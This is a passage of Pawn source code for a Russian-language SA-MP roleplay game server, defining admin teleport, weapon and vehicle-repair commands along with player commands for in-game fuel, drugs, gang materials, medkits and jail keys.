		    ptpx = -1336.3948, ptpy = 466.9529, ptpz = 7.1875;
			tpx = -1968.9689, tpy = 156.4293, tpz = 27.6875;
            tpint = 0, tpint = 0;
		}
	    case 17:
		{
      		ptpx = -1357.4685, ptpy = 434.1743, ptpz = 7.1875;
			tpx = -1357.4685, tpy = 434.1743, tpz = 7.1875;
            tpint = 0, tpint = 0;
		}
		case 18:
		{
		    ptpx = -1269.6945, ptpy = 502.9579, ptpz = 18.2294;
			tpx = -1269.6945, tpy = 502.9579, tpz = 18.2294;
            tpint = 0, tpint = 0;
		}
		case 19:
		{
		    ptpx = 1959.5488, ptpy = -2180.7593, ptpz = 13.5469;
			tpx = 321.2846, tpy = 1934.9167, tpz = 17.6406;
            tpint = 0, tpint = 0;
		}
		case 20:
		{
		    ptpx = 2424.8781, ptpy = -769.1270, ptpz = 1421.9255;
			tpx = 91.6006, tpy = 1182.4490, tpz = 21.1174;
            tpint = 0, tpint = 0;
		}
		case 21:
		{
		    ptpx = 1450.6117, ptpy = -2467.6792, ptpz = 13.5547;
			tpx = 2196.3066, tpy = -1682.1842, tpz = 14.0373;
            tpint = 0, tpint = 0;
		}
		case 22:
		{
		    ptpx = 2483.7451, ptpy = 2773.3271, ptpz = 10.4680;
			tpx = 197.1036, tpy = 158.6299, tpz = 1003.0234;
            tpint = 3, tpint = 30;
		}
		case 23:
		{
			ptpx = 2695.5076, ptpy = -1704.6638, ptpz = 11.8438;
			tpx = 217.7062, tpy = 121.7604, tpz = 999.0156;
            tpint = 10, tpint = 30;
		}
		case 24:
		{
		    ptpx = 2197.4595, ptpy = -2252.8787, ptpz = 13.5469;
			tpx = 2197.4595, tpy = -2252.8787, tpz = 13.5469;
            tpint = 0, tpint = 0;
		}
		case 25:
		{
		    ptpx = -769.78, ptpy = 495.13, ptpz = 1376.56;
			tpx = -769.78, tpy = 495.13, tpz = 1376.56;
            tpint = 1, tpint = 10;
		}
		case 26:
		{
		    ptpx = -1077.7568, ptpy = -2305.7173, ptpz = 52.3192;
			tpx = 2031.4806, tpy = 1014.9394, tpz = 10.8203;
            tpint = 0, tpint = 0;
		}
		case 27:
		{
		    ptpx = -1077.7568, ptpy = -2305.7173, ptpz = 52.3192;
			tpx = 2150.9121, tpy = 1675.8231, tpz = 10.8203;
            tpint = 0, tpint = 0;
		}
		case 28:
		{
		    ptpx = -1077.7568, ptpy = -2305.7173, ptpz = 52.3192;
			tpx = 1779.5966, tpy = -1908.7085, tpz = 13.3890;
            tpint = 0, tpint = 0;
		}
		default: tpx = 0.0;
	}
	if(tpx != 0.0)
	{
		if(GetPlayerState(playerid) == 2)
		{
			new tmpcar = GetPlayerVehicleID(playerid);
			SetVehiclePos(tmpcar, tpx,tpy,tpz);
			PlayerInfo[ playerid ][ pPos_x ] = ptpx;
			PlayerInfo[ playerid ][ pPos_y ] = ptpy;
			PlayerInfo[ playerid ][ pPos_z ] = ptpz;
			SetPVarInt(playerid, "AntiBreik", 2);
			TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
		}
		else
		{
			SetPlayerPos(playerid, tpx,tpy,tpz);
		}
		SCM(playerid, COLOR_YELLOW, " Вы телепортированы");
		SetPlayerInterior(playerid,tpint);
		SetPlayerVirtualWorld(playerid,tpvw);
		SetCameraBehindPlayer(playerid);
		return true;
	}
	ShowPlayerDialogEx(playerid, 10093, DIALOG_STYLE_LIST, "Телепорт", "[0] Основное", "Выбрать", "Назад");
	return true;
}
CMD:ajob(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	ShowPlayerDialogEx(playerid, 10092, DIALOG_STYLE_MSGBOX, "Приём на работу", "Вы хотите просмотреть список доступных работ?", "Да", "Нет");
	return true;
}
CMD:mark(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	GetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
	SCM(playerid, -1, " Точка телепорта установлена");
	return true;
}
CMD:gotomark(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePos(tmpcar, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
		SetPVarInt(playerid, "AntiBreik", 2);
		PlayerInfo[ playerid ][ pPos_x ] = TeleportDest[playerid][0];
		PlayerInfo[ playerid ][ pPos_y ] = TeleportDest[playerid][1];
		PlayerInfo[ playerid ][ pPos_z ] = TeleportDest[playerid][2];
		SetPVarInt(playerid, "AntiBreik", 2);
		TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
	}
	else SetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
	SCM(playerid, -1, " Вы были телепортированы");
	SetPlayerInterior(playerid,0);
	return true;
}
CMD:agoto(playerid)
{
	if(PlayerInfo[playerid][pAdmin] < 10) return true;
	if(!Goto[playerid])
	{
		Goto[playerid] = true;
		SCM(playerid, COLOR_GREEN, " Вы разрешили телепорт к вам.");
	}
	else
	{
		Goto[playerid] = false;
		SCM(playerid, COLOR_RED, " Вы запретили телепорт к вам.");
	}
	return true;
}
CMD:goto(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /goto [playerid]");
	new Float:plocx,Float:plocy,Float:plocz;
	if(!IsPlayerConnected(params[0])) return true;
	if(GetPlayerState(params[0]) != 1 && GetPlayerState(params[0]) != 2 && GetPlayerState(params[0]) != 3) return SCM(playerid, COLOR_GRAD1, " Игрок оффлайн / не залогинен");
	if((GetPlayerState(params[0]) == PLAYER_STATE_SPECTATING && gSpectateID[params[0]] != INVALID_PLAYER_ID) || (GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && gSpectateID[playerid] != INVALID_PLAYER_ID)) return SCM(playerid, COLOR_GRAD1, " Кто-то из вас в режиме наблюдения (/recon)");
	if(Goto[params[0]] == false && PlayerInfo[playerid][pAdmin] < 10) return SCM(playerid, COLOR_GREY, " В данный момент к нему телепортироваться нельзя!");
	GetPlayerPos(params[0], plocx, plocy, plocz);
	if (GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
		SetPVarInt(playerid, "AntiBreik", 2);
		PlayerInfo[ playerid ][ pPos_x ] = plocx;
		PlayerInfo[ playerid ][ pPos_y ] = plocy+4;
		PlayerInfo[ playerid ][ pPos_z ] = plocz;
		SetPVarInt(playerid, "AntiBreik", 2);
		TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
	}
	else
	{
		SetPlayerPos(playerid,plocx,plocy+2, plocz);
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(params[0]));
		SetPlayerInterior(playerid, GetPlayerInterior(params[0]));
	}
	SCM(playerid, -1, " Вы были телепортированы");
	return true;
}
CMD:gethome(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0 || PlayerInfo[playerid][pMember] == 2 && PlayerInfo[playerid][pRank] > 3) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /gethome [id]");
	foreach(i)
	{
		if(HGet(i) && PlayerInfo[i][pPHouseKey] == i)
		{
			format(YCMDstr,sizeof(YCMDstr)," Home: [%i], Player: [%i]",params[0],i);
			SCM(playerid,COLOR_GREY,YCMDstr);
		}
	}
	return true;
}
CMD:get(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	new param[40];
	if( sscanf( params, "s[32]S()[64]", param, params ) )
	{
		SCM(playerid, 0xffffffaa, "================ Get ================");
		SCM(playerid, 0xffffffaa, " Введите: /get [name]");
		SCM(playerid, 0xafafafaa, " Доступные названия: Drugs, Fuel, Guns, Medkit");
		SCM(playerid, 0x33aa33ff, "=====================================");
		return true;
	}
	if(strcmp(param, "fuel",true) == 0)
	{
		for(new b = 1; b <= TotalBizz; b++)
		{
			if(PlayerToPoint(10.0, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bType] == 4)
			{
				if(BizzInfo[b][bProducts] <= 0 && strcmp(BizzInfo[b][bOwner],"None",true) != 0) return SCM(playerid,COLOR_GRAD1,"Заправка не работает");
				if(BizzInfo[b][bLocked] == 1) return SCM(playerid,COLOR_GRAD1, "Заправка закрыта!");
				if(PlayerInfo[playerid][pFuel] != 0) return SCM(playerid, COLOR_GRAD1, "У вас уже есть канистра");
				if(PlayerInfo[playerid][pCash] < BizzInfo[b][bPrice]) return SCM(playerid,COLOR_GRAD1, "Не достаточно денег!");
				BizzInfo[b][bTill] += BizzInfo[b][bPrice]/4;
				BizzPay[b] += BizzInfo[b][bPrice]/4;
				PlayerInfo[playerid][pCash] -= BizzInfo[b][bPrice]/4;
				if(strcmp(BizzInfo[b][bOwner],"None",true) != 0) BizzInfo[b][bProducts] -= 20;
				format(string, 128, "Вы купили 20 литров бензина за %i вирт",BizzInfo[b][bPrice]/4);
				SCM(playerid, 0x6495EDFF, string);
				PlayerInfo[playerid][pFuel] = 1;
				PlayerInfo[playerid][pCash] -= BizzInfo[b][bPrice]/4;
				return true;
			}
		}
	}
	else if(strcmp(param, "drugs",true) == 0)
	{
		if(!IsAGang(playerid)) return SCM(playerid,COLOR_GRAD1, " Вы не бандит!");
		new ammo;
		if(sscanf( params, "d", ammo ) ) return SCM(playerid, -1, " Введите: /get drugs [количество]");
		if(!PlayerToPoint(3.0,playerid,322.1280,1118.8314,1083.8828)) return SCM(playerid, COLOR_GRAD1, " Вы не в притоне!");
		if(PlayerInfo[playerid][pCash] < ammo*20) return SCM(playerid,COLOR_GRAD1, " У вас недостаточно денег");
		if(PlayerInfo[playerid][pDrugs]+ammo >= 151) { SCM(playerid, COLOR_GREY, " Нельзя купить больше"); return true; }
		if(ammo > 150 || ammo < 1) { SCM(playerid, COLOR_GREY, " Нельзя меньше 1 или больше 150!"); return true; }
		PlayerInfo[playerid][pCash] -= ammo*20;
		PlayerInfo[playerid][pDrugs] += ammo;
		format(string, 128, " Вы купили %i грамм наркотиков за %i вирт (У вас есть %i грамм)", ammo, ammo*20, PlayerInfo[playerid][pDrugs]);
		SCM(playerid, 0x6495EDFF, string);
	}
	else if(strcmp(param,"guns",true) == 0)
	{
		if(IsAGang(playerid))
		{
			new numberof;
			if(sscanf( params, "d", numberof ) ) return SCM(playerid, COLOR_GRAD2, " Введите: /get guns [кол-во]");
			if(PlayerInfo[playerid][pRank] < 4) return SCM(playerid,COLOR_GREY," Функция доступна с 4 ранга");
			if(!IsATerra(playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
			if((PlayerInfo[playerid][pMats] + numberof) > 500) return SCM(playerid, COLOR_GRAD1," Нельзя взять больше");
			if(numberof < 1 || numberof > 500) return SCM(playerid, COLOR_GREY, " Вы не можете взять меньше 1 и больше 500 материалов");
			if(IsAGang(playerid) && PlayerInfo[playerid][pRank] >= 4)
			{
				if(PlayerInfo[playerid][pMember] == 12)
				{
					if(wareBallasLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(ballasmatbi <= numberof) return SCM(playerid, COLOR_GREY, " На складе нет материалов");
					ballasmatbi -= numberof;
				}
				else if(PlayerInfo[playerid][pMember] == 13)
				{
				    if(wareVagosLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(vagosmatbi <= numberof) return SCM(playerid, COLOR_GREY, " На складе нет материалов");
					vagosmatbi -= numberof;
				}
				else if(PlayerInfo[playerid][pMember] == 15)
				{
				    if(wareGrooveLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(groovmatbi <= numberof) return SCM(playerid, COLOR_GREY, " На складе нет материалов");
					groovmatbi -= numberof;
				}
				else if(PlayerInfo[playerid][pMember] == 17)
				{
				    if(wareAztecLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(aztekmatbi <= numberof) return SCM(playerid, COLOR_GREY, " На складе нет материалов");
					aztekmatbi -= numberof;
				}
				else if(PlayerInfo[playerid][pMember] == 18)
				{
				    if(wareRifaLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(rifamatbi <= numberof) return SCM(playerid, COLOR_GREY, " На складе нет материалов");
					rifamatbi -= numberof;
				}
				PlayerInfo[playerid][pMats] += numberof;
				format(string, 128, " У вас %i/500 материалов с собой", PlayerInfo[playerid][pMats]);
				SCM(playerid, -1, string);
				format(YCMDstr, sizeof(YCMDstr), " %s взял материалы со склада", Name(playerid));
				ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return true;
			}
		}
	}
	else if(strcmp(param,"medkit",true) == 0)
	{
		if((!IsAGang(playerid) && !IsAMafia(playerid)) || PlayerInfo[playerid][pRank] < 9) return SCM(playerid,COLOR_GREY," Вам недоступна данная команда");
		if(!PlayerToPoint(30, playerid,372.0985,-53.2946,1076.4708))
		{
			new _null;
			switch(PlayerInfo[playerid][pMember])
			{
			case 12: _null = ballashel; case 13: _null = vagoshel; case 15: _null = groovhel;
			case 17: _null = aztekhel; case 18: _null = rifahel; case 6: _null = yakuzahel;
			case 5: _null = lcnhel; case 14: _null = rmhel;
			}
			return SendMes(playerid,0x6495EDFF," На складе организации %i аптечек",_null);
		}
		new null;
		if(sscanf(params, "i",null) || null < 1 || null > 5000) return SCM(playerid, -1, " Введите: /get medkit [колличество] (стоимость 1 аптечки - 4 вирт)");
		switch(PlayerInfo[playerid][pMember])
		{
		case 12:
			{
				if(ballashel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(FracBank[0][fBallas] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				ballashel+=null;
				FracBank[0][fBallas]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,FracBank[0][fBallas]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 13:
			{
				if(vagoshel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(FracBank[0][fVagos] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				vagoshel+=null;
				FracBank[0][fVagos]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,FracBank[0][fVagos]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 15:
			{
				if(groovhel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(FracBank[0][fGrove] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				groovhel+=null;
				FracBank[0][fGrove]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,FracBank[0][fGrove]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 17:
			{
				if(aztekhel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(FracBank[0][fAztek] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				aztekhel+=null;
				FracBank[0][fAztek]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,FracBank[0][fAztek]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 18:
			{
				if(rifahel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(FracBank[0][fRifa] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				rifahel+=null;
				FracBank[0][fRifa]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,FracBank[0][fRifa]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 6:
			{
				if(yakuzahel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(MafiaBank[0][nYakuza] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				yakuzahel+=null;
				MafiaBank[0][nYakuza]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,MafiaBank[0][nYakuza]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 5:
			{
				if(lcnhel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(MafiaBank[0][nLcn] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				lcnhel+=null;
				MafiaBank[0][nLcn]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,MafiaBank[0][nLcn]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 14:
			{
				if(rmhel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(MafiaBank[0][nRm] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				rmhel+=null;
				MafiaBank[0][nRm]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,MafiaBank[0][nRm]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		}
	}
	return true;
}
CMD:fillcar(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GREY," У вас нет машины!");
	new car = GetPlayerVehicleID(playerid);
	if(PlayerInfo[playerid][pFuel] != 1) return SCM(playerid, COLOR_GREY, " У вас нет канистры");
	if(!IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(car) == 481 || GetVehicleModel(car) == 509 || GetVehicleModel(car) == 510) return SCM(playerid,COLOR_YELLOW, " Вы не в автомобиле/Этот транспорт нельзя заправить");
	SCM(playerid, 0x6495EDFF, " Вы дозаправили свой автомобиль 20 литрами бензина");
	Fuell[car] += 20;
	PlayerInfo[playerid][pFuel] = 0;
	return true;
}
CMD:gethere(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	new plo;
	if(sscanf(params, "u",plo)) return SCM(playerid, -1, " Введите: /gethere [playerid]");
	if(PlayerInfo[plo][pAdmin] >= 10 && PlayerInfo[playerid][pAdmin] < 10) return SCM(playerid, COLOR_GREY, " Вы не можете телепортировать его!");
	if(IsPlayerInAnyVehicle(plo)) return SCM(playerid, COLOR_GREY, " Вы не можете телепортировать игрока, так как он находится в машине!");
	new Float:plocx,Float:plocy,Float:plocz;
	new inter = GetPlayerInterior(playerid);
	new worldd = GetPlayerVirtualWorld(playerid);
	if(IsPlayerConnected(plo))
	{
		if(plo != INVALID_PLAYER_ID)
		{
			if(PlayerInfo[playerid][pAdmin] >= 3)
			{
				if(GetPlayerState(plo) != 1 && GetPlayerState(plo) != 2 && GetPlayerState(plo) != 3) return	SCM(playerid, COLOR_GRAD1, " Игрок оффлайн / не залогинен");
			//	if(GetPVarInt(plo, "AFK_Time") > 2 && PlayerInfo[plo][pAdmin] <= 0) return SCM(playerid, COLOR_GREY, " Данный игрок AFK");
				GetPlayerPos(playerid, plocx, plocy, plocz);
				SetPlayerInterior(plo,inter);
				SetPlayerVirtualWorld(plo,worldd);
				if (GetPlayerState(plo) == 2)
				{
					TelePos[plo][0] = 0.0;
					TelePos[plo][1] = 0.0;
					SetPlayerInterior(plo,inter);
					new tmpcar = GetPlayerVehicleID(plo);
					SetPlayerVirtualWorld(plo,worldd);
					SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
					SetPVarInt(plo, "AntiBreik", 2);
					PlayerInfo[ plo ][ pPos_x ] = plocx;
					PlayerInfo[ plo ][ pPos_y ] = plocy+4;
					PlayerInfo[ plo ][ pPos_z ] = plocz;
					SetPVarInt(plo, "AntiBreik", 2);
				}
				else
				{
					SetPlayerPos(plo,plocx,plocy+2, plocz);
					SetPlayerInterior(plo,inter);
					SetPlayerVirtualWorld(plo,worldd);
				}
				SendMes(plo, -1, " Вас телепортировал к себе администратор %s", NameServer);
			}
		}
	}
	return true;
}
CMD:g(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0])) return GiveWeapon(playerid,24,120);
	if(params[0] != 23 && params[0] != 24 && params[0] != 25 && params[0] != 29 && params[0] != 33 && params[0] != 31) return SCM(playerid, COLOR_GREY, " Доступно только оружие: 23, 24, 25, 29, 33, 31");
	GiveWeapon(playerid,params[0],120);
	return true;
}
CMD:agun(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /agun [id оружия] [патроны]");
	if(params[1] < 1 || params[1] > 999) return SCM(playerid, COLOR_GRAD1, "Нельзя меньше 1 или больше 999 патронов!");
	if(params[0] < 1 || params[0] > 46) return SCM(playerid, COLOR_GRAD1, "ID Оружия от 1 до 46");
	GiveWeapon(playerid, params[0],params[1]);
	SCM(playerid, COLOR_GRAD1, " Оружие Выдано");
	return true;
}
CMD:takegun(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /takegun [id игрока]");
	DelGun(params[0]);
	format(string, 68, "Администратор %s отобрал у вас оружие", PlayerInfo[playerid][pName]);
	SCM(params[0], -1, string);
	SCM(playerid, -1, " Вы отобрали оружие у игрока");
	return true;
}
CMD:givegun(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "udd",params[0],params[1],params[2])) return SCM(playerid, -1, " Введите: /givegun [id] [id оружия] [патроны]");
	if(params[2] < 1 || params[2] > 999) return SCM(playerid, COLOR_GRAD1, " Нельзя меньше 1 или больше 999 патронов!");
	if(params[1] < 1 || params[1] > 46) return SCM(playerid, COLOR_GRAD1, "ID Оружия от 1 до 46");
	GiveWeapon(params[0],params[1],params[2]);
	return true;
}
CMD:hpcar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(IsPlayerInAnyVehicle(playerid))
	{
		AnRepairVehicle(GetPlayerVehicleID(playerid));
		Fuell[GetPlayerVehicleID(playerid)] = 200;
		SCM(playerid, -1, " Машина отремонтирована!");
		SetVehicleParamsEx(GetPlayerVehicleID(playerid),true,lights,alarm,doors,bonnet,boot,objective);
		PlayerPlaySound(playerid, 32000, 0.0, 0.0, 0.0);
	}
	return true;
}
CMD:hp(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	SetPlayerHealthAC(playerid, 255.0);
	PlayerInfo[playerid][pHP] = 255;
	return true;
}
CMD:fixveh(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /fixveh [id машины]");
	AnRepairVehicle(params[0]);
	SetVehicleParamsEx(params[0],true,lights,alarm,doors,bonnet,boot,objective);
	return true;
}
CMD:fixvehs(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new Float:pos = 60.0,Float:car_x,Float:car_y,Float:car_z;
	for(new cars=0;cars<MAX_VEHICLES;cars++)
	{
		if(GetVehicleModel(cars) > 399)
		{
			GetVehiclePos(cars,car_x,car_y,car_z);
			if(IsPlayerInRangeOfPoint(playerid,pos,car_x,car_y,car_z))
			{
				AnRepairVehicle(cars);
				SetVehicleHealth(cars, 1000.0);
			}
		}
	}
	SCM(playerid, -1, " Машины отремонтированы!");
	return 1;
}
CMD:satiety(playerid)
{
	format(YCMDstr,64, " Ваша «Сытость»: %i / 100",PlayerInfo[playerid][pSatiety]);
	SCM(playerid,0x6495EDFF,YCMDstr);
	return true;
}
CMD:sethealcost(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 4 || PlayerInfo[playerid][pLeader] == 22 || PlayerInfo[playerid][pLeader] == 33)
	{
		if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /sethealcost [сумма]");
		if(params[0] < 1 || params[0] > 30) { SCM(playerid, COLOR_GREY, " Вы не можете поставить меньше 0 и больше 30"); return true; }
		healpric = params[0];
		return true;
	}
	return true;
}
CMD:escape(playerid, params[])
{
	if(!IsAGang(playerid)) return true;
	if(PlayerInfo[playerid][pJailTime] < 1) return SCM(playerid, COLOR_GRAD1, " Вы не в тюрьме!");
	if(PlayerInfo[playerid][pKeys] <= 0) return SCM(playerid, COLOR_GRAD1, " У Вас нет ключа от тюрьмы!");
	PlayerInfo[playerid][pKeys] --;
	if(PlayerInfo[playerid][pMestoJail] == 1) SetPlayerInterior(playerid, 0), SetPlayerPos(playerid,1553.4962,-1675.2714,16.1953), SetPlayerFacingAngle(playerid, 95.0636);
	if(PlayerInfo[playerid][pMestoJail] == 2) SetPlayerInterior(playerid, 0), SetPlayerPos(playerid,-1607.1873,721.3649,12.2721), SetPlayerFacingAngle(playerid, 2.3026);
	if(PlayerInfo[playerid][pMestoJail] == 3) SetPlayerInterior(playerid, 0), SetPlayerPos(playerid,2334.8467,2454.9456,14.9688), SetPlayerFacingAngle(playerid, 115.7874);
	PlayerInfo[playerid][pJailTime] = 0;
	PlayerInfo[playerid][pMestoJail] = 0;
	SetPlayerVirtualWorld(playerid, 0);
	PlayerCuffed[playerid] = 0;
	SCM(playerid, COLOR_YELLOW, " Вы совершили побег из тюрьмы");
	return true;
}
CMD:getekey(playerid, params[])
{
//	if(PlayerInfo[playerid][pKeys] <= 0) return SCM(playerid, COLOR_GRAD1, " У Вас нет ключей от тюрьмы!");
	format(YCMDstr, sizeof(YCMDstr), " У вас %i/5 ключей", PlayerInfo[playerid][pKeys]);
	SCM(playerid, -1, YCMDstr);
	//format(YCMDstr, sizeof(YCMDstr), "%s достает ключи",Name(playerid));
	//ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return true;
}
CMD:takekeys(playerid, params[])
{
	if(!IsACop(playerid)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
	if(GetPVarInt(playerid, "inUchastok"))
	{
	    if(PlayerInfo[playerid][pKeys] > 0) return SCM(playerid, COLOR_GREY, " У вас уже есть ключи от камеры");
		if(strlen(params) == 0) return SCM(playerid, -1, " Введите: /takekeys [причина]");
		PlayerInfo[playerid][pKeys] ++;
		format(string, 128, " %s взял ключи от камеры. Причина: %s", Name(playerid), params);
		ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SendFamilyMessage(PlayerInfo[playerid][pMember], TEAM_BLUE_COLOR, string);
		if(tipsteron == PlayerInfo[playerid][pMember]) foreach(i) if(tipsterlisten[i]) SCM(i, COLOR_LIGHTRED, string);
	}
	else return SCM(playerid, COLOR_GREY, " Вы должны находиться в полицейском участке");
	return true;
}
CMD:sellekey(playerid, params[])
{
	//if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Вы не бандит!");
	if(sscanf(params, "udd", params[0],params[1],params[2])) return SCM(playerid, -1, " Введите: /sellekey [id] [кол-во] [Цена]");
	if(params[1] < 1 || params[1] > 5) { SCM(playerid, COLOR_GREY, " Ключей не может быть меньше 1 и больше 5!"); return true; }
	if(params[2] < 1 || params[2] > 50000) { SCM(playerid, COLOR_GREY, " Цена не может быть меньше 1 и больше 50000 вирт!"); return true; }
	if(params[1] > PlayerInfo[playerid][pKeys]) { SCM(playerid, COLOR_GREY, " У вас нет столько ключей!"); return true; }
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid,COLOR_GREY," Вы должны находиться рядом друг с другом");
	if(PlayerInfo[params[0]][pKeys] >= 5)return SCM(playerid,COLOR_GREEN, " У игрока уже имеется 5 ключей!");
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете продать себе ключи!");
	format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s купить %i ключей за %i вирт",Name(params[0]),params[1],params[2]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает вам купить %i ключей за %i вирт. ((Введите: /accept ekey для покупки ))",Name(playerid),params[1],params[2]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	KeysOffer[params[0]] = playerid;
	KeysPrice[params[0]] = params[2];
